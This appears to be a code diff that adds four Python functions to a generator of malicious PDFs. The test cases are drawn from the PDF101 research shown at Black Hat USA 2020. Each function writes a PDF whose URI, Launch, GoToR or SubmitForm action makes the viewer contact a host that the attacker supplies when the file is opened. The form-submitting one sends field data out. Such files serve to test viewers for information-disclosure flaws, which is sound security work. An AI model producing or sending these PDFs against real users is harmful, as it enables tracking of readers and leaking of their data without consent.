@@ -14,6 +14,326 @@
 import io
 import sys
 
+## Testcase from ./02-exploits/15-masterpdf-editor/02-disclosure-01-url-invocation.pdf
+## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
+def create_malpdf8(filename, host):
+    with io.FileIO(filename, "w") as file:
+        file.write(
+'''
+%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /OpenAction 5 0 R
+     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'form'    ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /SubmitForm
+     /F << /Type /FileSpec /F ('''+host+'''/test8.pdf) /V true /FS /URL >>
+     /Flags 4 % SubmitHTML
+   % /Flags 32 % SubmitXFDF
+   % /Flags 256 % SubmitPDF
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000187 00000 n
+0000000288 00000 n
+0000000553 00000 n
+0000000673 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+908
+%%EOF
+''')
+
+## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch3.pdf
+## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
+def create_malpdf7(filename, host):
+    with io.FileIO(filename, "w") as file:
+        file.write(
+'''
+%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [<< /Type /Annot
+                 /Subtype /Link
+                 /Open true
+                 /A 5 0 R
+                 /H /N
+                 /Rect [0 0 595 842]
+              >>]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'gotor'   ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /GoToR
+     /F << /Type /FileSpec /F ('''+host+'''/test7.pdf) /V true /FS /URL >>
+     /NewWindow false
+     /D [0 /Fit]
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000069 00000 n
+0000000170 00000 n
+0000000629 00000 n
+0000000749 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+937
+%%EOF
+''')
+
+## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch2.pdf
+## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
+def create_malpdf6(filename, host):
+    with io.FileIO(filename, "w") as file:
+        file.write(
+'''
+%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [<< /Type /Annot
+                 /Subtype /Link
+                 /Open true
+                 /A 5 0 R
+                 /H /N
+                 /Rect [0 0 595 842]
+              >>]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'launch'  ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /Launch
+     /F << /Type /FileSpec /F (''' + host + '''/test6.pdf) /V true /FS /URL >>
+     /NewWindow false
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000069 00000 n
+0000000170 00000 n
+0000000629 00000 n
+0000000749 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+922
+%%EOF
+''')
+
+## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch.pdf
+## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
+def create_malpdf5(filename, host):
+    with io.FileIO(filename, "w") as file:
+        file.write('''
+%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [<< /Type /Annot
+                 /Subtype /Link
+                 /Open true
+                 /A 5 0 R
+                 /H /N
+                 /Rect [0 0 595 842]
+              >>]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'uri'     ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /URI
+     /URI (''' + host + '''/test5)
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000069 00000 n
+0000000170 00000 n
+0000000629 00000 n
+0000000749 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+854
+%%EOF
+''')
+
 def create_malpdf3(filename, host):
     with io.FileIO(filename, "w") as file:
         file.write(
@@ -215,5 +535,9 @@ if __name__ == "__main__":
   create_malpdf2("test3.pdf", 'https://' + host)
   create_malpdf3("test4.pdf", 'https://' + host)
   create_malpdf4("test5.pdf", 'https://' + host)
+  create_malpdf5("test6.pdf", 'https://' + host)
+  create_malpdf6("test7.pdf", 'https://' + host)
+  create_malpdf7("test8.pdf", 'https://' + host)
+  create_malpdf8("test9.pdf", 'https://' + host)
 
   print("Done.")
